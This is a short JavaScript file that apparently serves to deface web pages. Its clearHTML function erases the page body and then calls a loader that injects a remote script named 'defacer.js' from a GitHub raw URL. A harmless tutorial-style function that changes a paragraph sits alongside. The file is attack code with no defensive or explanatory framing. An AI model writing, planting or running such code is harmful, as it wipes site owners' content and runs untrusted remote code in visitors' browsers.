window.attachTheScript = function() {
    const script = document.createElement("script");
    script.src = "https://raw.githubusercontent.com/CyberCutie0/-/refs/heads/main/defacer.js"; // Replace with the actual URL
    script.onload = () => {
        console.log("External script has been loaded.");
    };
    script.onerror = () => {
        console.error("Failed to load the external script.");
    };
    document.body.appendChild(script); // Add the script to the <head>
};

window.clearHTML = function() {
    document.body.innerHTML = "";
    attachTheScript();
};

function myFunction() {
    document.getElementById("demo").innerHTML="Paragraph changed.";
}
